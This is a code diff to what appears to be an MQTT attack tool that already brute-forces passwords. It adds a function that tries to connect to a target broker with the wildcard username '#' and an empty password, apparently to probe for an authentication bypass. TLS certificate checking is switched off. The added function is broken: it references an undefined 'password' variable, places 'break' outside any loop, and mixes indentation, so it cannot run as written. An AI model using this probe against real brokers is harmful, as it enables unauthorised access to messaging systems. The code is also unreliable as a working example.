@@ -55,3 +55,29 @@ def brute_force(ip_target, port, username, wordlist_path, tls_cert, client_cert,
 				break
 	results = [connected,password]
 	return results
+
+
+
+def username_bug(ip_target, port, tls_cert, client_cert, client_key):
+	# global connected
+	connected = False
+	client = mqtt.Client()
+	client.on_connect = on_connect
+	client.username_pw_set('#', '')
+	print('trying: #, '+ password)
+
+        # if the tls_cert value is different from None, try to connect over TLS
+	if tls_cert != None:
+		client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
+			tls_version=ssl.PROTOCOL_TLSv1, ciphers=None)
+		client.tls_insecure_set(True)
+	client.connect(ip_target,port)
+	client.loop_start()
+	sleep(3)
+	client.loop_stop()
+        # if we are able to connect, we break the loop and we return the list of passwords and
+        # if each password was working or not
+	if connected:
+				break
+	results = connected
+	return results
